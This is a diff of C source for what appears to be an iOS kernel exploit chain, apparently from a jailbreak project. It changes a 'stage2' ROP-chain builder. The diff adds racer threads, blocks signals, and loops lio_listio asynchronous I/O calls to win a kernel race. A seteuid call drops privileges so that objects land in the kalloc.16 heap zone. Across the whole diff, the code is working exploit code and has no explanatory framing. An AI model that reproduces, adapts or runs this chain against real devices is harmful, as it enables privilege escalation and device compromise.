@@ -154,7 +154,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 				break;
 			case BARRIER:
 				if (chain_pos > next->value) {
-					printf("stage 2 doesn't have enought space\n");
+					printf("not enought space to place barrier\n");
 					exit(1);
 				}
 				uint64_t diff = next->value - chain_pos - offsets->stage2_base;
@@ -415,7 +415,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 				break;
 			case BARRIER:
 				if (current_addr > next->value) {
-					printf("stage 2 doesn't have enought space\n");
+					printf("not enought space to place barrier\n");
 					exit(1);
 				}
 				uint64_t diff = next->value - current_addr;
@@ -785,12 +785,14 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),tmp);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
 
-	DEFINE_ROP_VAR("mysigmask",sizeof(uint64_t),tmp);
-	SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1)));
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("mysigmask",2);
-	CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
-
+	// block all the signals the racing threads use
+	for (int i = 0; i < 4; i++){ 
+		DEFINE_ROP_VAR("mysigmask",sizeof(uint64_t),tmp);
+		SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1+i)));
+		ROP_VAR_ARG_HOW_MANY(1);
+		ROP_VAR_ARG("mysigmask",2);
+		CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
+	}
 
 	DEFINE_ROP_VAR("mach_host",sizeof(mach_port_t),tmp);
 	CALL_FUNC_RET_SAVE_VAR("mach_host",get_addr_from_name(offsets,"mach_host_self"),0,0,0,0,0,0,0,0);
@@ -806,17 +808,6 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	CFDataRef myservice_serialized = IOCFSerialize(myservice_dict, kIOCFSerializeToBinary /*gIOKitLibSerializeOptions*/);
 	CFRelease(myservice_dict);
 	uint64_t data_length = CFDataGetLength(myservice_serialized);
-
-	uint64_t cache_addr = 0;
-	syscall(294, &cache_addr);
-	printf("%llx\n",cache_addr);
-	
-	kern_return_t (*matching_service_bin)(mach_port_t,void * ,mach_msg_type_number_t,mach_port_t *) = realsym("/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64","_io_service_get_matching_service_bin") - 0x180000000 + cache_addr;
-	mach_port_t test_port = MACH_PORT_NULL;
-	mach_port_t host_port;
-	host_get_io_master(mach_host_self(),&host_port);
-	matching_service_bin(host_port,CFDataGetBytePtr(myservice_serialized),data_length,&test_port);
-	if(test_port == MACH_PORT_NULL) {printf("test_port is null");exit(1);}
 
 	struct GetMatchingService_Request {
 		mach_msg_header_t Head;
@@ -851,7 +842,6 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct GetMatchingService_Request)-4096+((data_length+3) & ~3), sizeof(struct GetMatchingService_Reply), 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
 
 	ROP_VAR_CPY_W_OFFSET("service",0,"service_request",offsetof(struct GetMatchingService_Reply,service.name),sizeof(mach_port_t));
-	printf("AAA msgh_id %d (NOTIFY:%d) msgh_bits %d (COMPLEX %d) body.descriptor_count %d size %d RetCode %d\n",offsetof(struct GetMatchingService_Reply,Head.msgh_id),MACH_NOTIFY_SEND_ONCE,offsetof(struct GetMatchingService_Reply,Head.msgh_bits), MACH_MSGH_BITS_COMPLEX,offsetof(struct GetMatchingService_Reply,body.msgh_descriptor_count), sizeof(struct GetMatchingService_Reply), offsetof(mig_reply_error_t,RetCode));
 
 	// IOServiceOpen
 	
@@ -911,8 +901,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 
 #define BARRIER_BUFFER_SIZE 0x10000
-	// spawn racer thread
-	// CALL("pthread_create",0,offsets->longjmp-0x18095c2e4+offsets->new_cache_addr /*slide it here*/,offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/,0,0,0,0,0);
+	// spawn racer threads
+	
 #define _STRUCT_ARM_THREAD_STATE64	struct __darwin_arm_thread_state64
 _STRUCT_ARM_THREAD_STATE64
 {
@@ -935,6 +925,22 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG("racer_kernel_thread",5);
 	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
 
+	
+	
+	DEFINE_ROP_VAR("racer_kernel_thread2",sizeof(thread_act_t),tmp);
+	_STRUCT_ARM_THREAD_STATE64 * new_thread_state2 = malloc(sizeof(_STRUCT_ARM_THREAD_STATE64));
+	memset(new_thread_state2,0,sizeof(_STRUCT_ARM_THREAD_STATE64));
+	new_thread_state2->__pc = offsets->longjmp-0x180000000+offsets->new_cache_addr; /*slide it here*/
+	new_thread_state2->__x[0] = offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE + offsets->thread_max_size; /*x0 should point to the longjmp buf*/;
+	DEFINE_ROP_VAR("thread_state2",sizeof(_STRUCT_ARM_THREAD_STATE64),new_thread_state2)
+	/*
+	ROP_VAR_ARG_HOW_MANY(3);
+	ROP_VAR_ARG64("self",1);
+	ROP_VAR_ARG("thread_state2",3);
+	ROP_VAR_ARG("racer_kernel_thread2",5);
+	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
+	*/
+
 
 	// we need to wait for a short amout of time till the other thread called open
 	// we can't call usleep on it's own so we just run our own implementation
@@ -943,7 +949,9 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG64("reply_port",5); \
 	CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_TIMEOUT | MACH_RCV_INTERRUPT,0,0,0 /*recv port*/, (usec+999)/1000, MACH_PORT_NULL,0);
 
-	ADD_USLEEP(100000);
+	ADD_LOOP_START("test");
+		ADD_USLEEP(100000000);
+	ADD_LOOP_END();
 
 	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
 
@@ -1213,22 +1221,25 @@ _STRUCT_ARM_THREAD_STATE64
 	DEFINE_ROP_VAR("aios",NENT * sizeof(struct aiocb),tmp);
 	DEFINE_ROP_VAR("aio_buf",NENT,tmp);
 
-	DEFINE_ROP_VAR("sigevent",sizeof(struct sigevent),tmp);
-	SET_ROP_VAR32_W_OFFSET("sigevent",SIGEV_SIGNAL,offsetof(struct sigevent,sigev_notify));
-	SET_ROP_VAR32_W_OFFSET("sigevent",SIGWINCH,offsetof(struct sigevent,sigev_signo));
+	// block all the racing signals and unblock the one we use below
+	for (int i = 0; i < 4; i++){ 
+		DEFINE_ROP_VAR("mysigmask",sizeof(uint64_t),tmp);
+		SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1+i)));
+		ROP_VAR_ARG_HOW_MANY(1);
+		ROP_VAR_ARG("mysigmask",2);
+		CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
+	}
 
 	DEFINE_ROP_VAR("signal_set",sizeof(sigset_t),tmp);
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("signal_set",1);
-	CALL("sigemptyset",0,0,0,0,0,0,0,0);
-	
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("signal_set",1);
-	CALL("sigaddset",0, SIGWINCH,0,0,0,0,0,0);
+	SET_ROP_VAR64("signal_set",(1 << (SIGWINCH-1)));
 
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("signal_set",2);
 	CALL("__pthread_sigmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);
+
+	DEFINE_ROP_VAR("sigevent",sizeof(struct sigevent),tmp);
+	SET_ROP_VAR32_W_OFFSET("sigevent",SIGEV_SIGNAL,offsetof(struct sigevent,sigev_notify));
+	SET_ROP_VAR32_W_OFFSET("sigevent",SIGWINCH,offsetof(struct sigevent,sigev_signo));
 
 	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
 	memset(myaction,0,sizeof(struct __sigaction));
@@ -1240,7 +1251,6 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG("my_action",2);
 	CALL("__sigaction",SIGWINCH,0,0,0,0,0,0,0);
 
-	// TODO: we can optimize this
 	for (uint32_t i = 0; i < NENT; i++) {
 		int offset = sizeof(struct aiocb) * i;
 		ROP_VAR_CPY_W_OFFSET("aios",offset + offsetof(struct aiocb,aio_fildes),"racer_fd",0,4);
@@ -1249,28 +1259,20 @@ _STRUCT_ARM_THREAD_STATE64
 		SET_ROP_VAR64_W_OFFSET("aios",1,offset + offsetof(struct aiocb,aio_nbytes));
 		SET_ROP_VAR32_W_OFFSET("aios",LIO_READ,offset + offsetof(struct aiocb,aio_lio_opcode)); 
 		SET_ROP_VAR32_W_OFFSET("aios",SIGEV_NONE,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));
-		//SET_ROP_VAR32_W_OFFSET("aios",SIGEV_SIGNAL,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));
-		//SET_ROP_VAR32_W_OFFSET("aios",SIGWINCH,offset + offsetof(struct aiocb,aio_sigevent.sigev_signo));
 
 		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list",i*8,"aios",offset);
 	}
 
-	//the framework doesn't support inner loops atm, so I hope this works... fingers crossed
 	ADD_LOOP_START("racer_loop");
-
-		ROP_VAR_ARG_HOW_MANY(2);
-		ROP_VAR_ARG("aio_list",2);
-		ROP_VAR_ARG("sigevent",4);
-		CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
-		
+		for (int i = 0; i<64;i++) {
+			ROP_VAR_ARG_HOW_MANY(2);
+			ROP_VAR_ARG("aio_list",2);
+			ROP_VAR_ARG("sigevent",4);
+			CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
+		}
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG64("reply_port",5); 
 		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_RCV_TIMEOUT,0,0,0 /*recv port*/, 1, MACH_PORT_NULL,0);
-		/*
-		ROP_VAR_ARG_HOW_MANY(1);
-		ROP_VAR_ARG("test_string",2);
-		CALL("write",1,0,1024,0,0,0,0,0);
-		*/
 		
 		for (int i = 0; i < NENT; i++) {
 			ROP_VAR_ARG_HOW_MANY(1);
@@ -1284,8 +1286,113 @@ _STRUCT_ARM_THREAD_STATE64
 		ADD_LOOP_BREAK_IF_X0_NONZERO("racer_loop");
 	ADD_LOOP_END();
 	
-	ADD_USLEEP(10000000);
+	// this thread wasn't spawned using pthread so we can't easily exit...
+	ADD_LOOP_START("endless_thread_loop");
+		ADD_USLEEP(10000000);
+	ADD_LOOP_END();
 
+	// THREAD 3 starts here
+	ADD_BARRIER(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE + offsets->thread_max_size);
+ 
+
+	// longjmp buf, pivoting everything
+	ADD_GADGET(); /* x19 */
+    ADD_GADGET(); /* x20 */
+    ADD_GADGET(); /* x21 */
+    ADD_GADGET(); /* x22 */
+    ADD_GADGET(); /* x23 */
+    ADD_GADGET(); /* x24 */
+    ADD_GADGET(); /* x25 */
+    ADD_GADGET(); /* x26 */
+    ADD_GADGET(); /* x27 */
+    ADD_GADGET(); /* x28 */
+    ADD_GADGET(); /* x29 */
+    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 */ 
+    ADD_GADGET(); /* x29 */ 
+    ADD_STATIC_GADGET(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE + offsets->thread_max_size+ 22*8 /*jump over that longjmp buffer here*/); /* x2 */ 
+    ADD_GADGET(); /* D8 */
+    ADD_GADGET(); /* D9 */
+    ADD_GADGET(); /* D10 */
+    ADD_GADGET(); /* D11 */
+    ADD_GADGET(); /* D12 */
+    ADD_GADGET(); /* D13 */
+    ADD_GADGET(); /* D14 */
+    ADD_GADGET(); /* D15 */
+
+	//  int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
+	DEFINE_ROP_VAR("racer_fd2",sizeof(uint64_t),tmp);
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("racer_path",1);
+	CALL_FUNC_RET_SAVE_VAR("racer_fd2",get_addr_from_name(offsets,"open"),0,O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO,0,0,0,0,0);
+
+	DEFINE_ROP_VAR("aio_list2",NENT * 8,tmp);
+	DEFINE_ROP_VAR("aios2",NENT * sizeof(struct aiocb),tmp);
+
+	// block the signals the other racing threads use (we just block all and then unblock below)
+	DEFINE_ROP_VAR("mysigmask3",sizeof(uint64_t),tmp);
+	for (int i = 0; i < 4; i++) { 
+		SET_ROP_VAR64("mysigmask3",(1 << (SIGWINCH-1+i)));
+		ROP_VAR_ARG_HOW_MANY(1);
+		ROP_VAR_ARG("mysigmask3",2);
+		CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
+	}
+
+	DEFINE_ROP_VAR("signal_set2",sizeof(sigset_t),tmp);
+	SET_ROP_VAR64("signal_set2",(1 << (SIGWINCH-1+1)));
+
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("signal_set2",2);
+	CALL("__pthread_sigmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);
+
+	DEFINE_ROP_VAR("sigevent2",sizeof(struct sigevent),tmp);
+	SET_ROP_VAR32_W_OFFSET("sigevent2",SIGEV_SIGNAL,offsetof(struct sigevent,sigev_notify));
+	SET_ROP_VAR32_W_OFFSET("sigevent2",SIGWINCH+1,offsetof(struct sigevent,sigev_signo));
+
+	struct __sigaction * myaction2 = malloc(sizeof(struct __sigaction));
+	memset(myaction2,0,sizeof(struct __sigaction));
+	myaction2->sa_handler = (void (*)(int)) offsets->rop_nop-0x180000000+offsets->new_cache_addr;
+	myaction2->sa_tramp = (void (*)(void *, int, int, siginfo_t *, void *)) get_addr_from_name(offsets,"_sigtramp")-0x180000000+offsets->new_cache_addr;
+	myaction2->sa_mask = (1 << (SIGWINCH-1+1));
+	DEFINE_ROP_VAR("my_action2",sizeof(struct __sigaction),myaction2);
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("my_action2",2);
+	CALL("__sigaction",SIGWINCH+1,0,0,0,0,0,0,0);
+
+	for (uint32_t i = 0; i < NENT; i++) {
+		int offset = sizeof(struct aiocb) * i;
+		ROP_VAR_CPY_W_OFFSET("aios",offset + offsetof(struct aiocb,aio_fildes),"racer_fd2",0,4);
+		SET_ROP_VAR64_W_OFFSET("aios2",0,offset + offsetof(struct aiocb,aio_offset)); 
+		SET_ROP_VAR64_TO_VAR_W_OFFSET("aios2",offset+offsetof(struct aiocb,aio_buf),"aio_buf",i);
+		SET_ROP_VAR64_W_OFFSET("aios2",1,offset + offsetof(struct aiocb,aio_nbytes));
+		SET_ROP_VAR32_W_OFFSET("aios2",LIO_READ,offset + offsetof(struct aiocb,aio_lio_opcode)); 
+		SET_ROP_VAR32_W_OFFSET("aios2",SIGEV_NONE,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));
+
+		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list2",i*8,"aios2",offset);
+	}
+
+	ADD_LOOP_START("racer_loop2");
+		for (int i = 0; i<64;i++) {
+			ROP_VAR_ARG_HOW_MANY(2);
+			ROP_VAR_ARG("aio_list2",2);
+			ROP_VAR_ARG("sigevent2",4);
+			CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
+		}
+		ROP_VAR_ARG_HOW_MANY(1);
+		ROP_VAR_ARG64("reply_port",5); 
+		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_RCV_TIMEOUT,0,0,0 /*recv port*/, 1, MACH_PORT_NULL,0);
+		
+		for (int i = 0; i < NENT; i++) {
+			ROP_VAR_ARG_HOW_MANY(1);
+			ROP_VAR_ARG64_W_OFFSET("aio_list2",1,i*8);
+			CALL("aio_return",0,0,0,0,0,0,0,0);
+		}
+
+		// set x0 
+		SET_X0_FROM_ROP_VAR("should_race");
+		// break out of the loop if x0 is nonzero
+		ADD_LOOP_BREAK_IF_X0_NONZERO("racer_loop2");
+	ADD_LOOP_END();
+	
 	// this thread wasn't spawned using pthread so we can't easily exit...
 	ADD_LOOP_START("endless_thread_loop");
 		ADD_USLEEP(10000000);
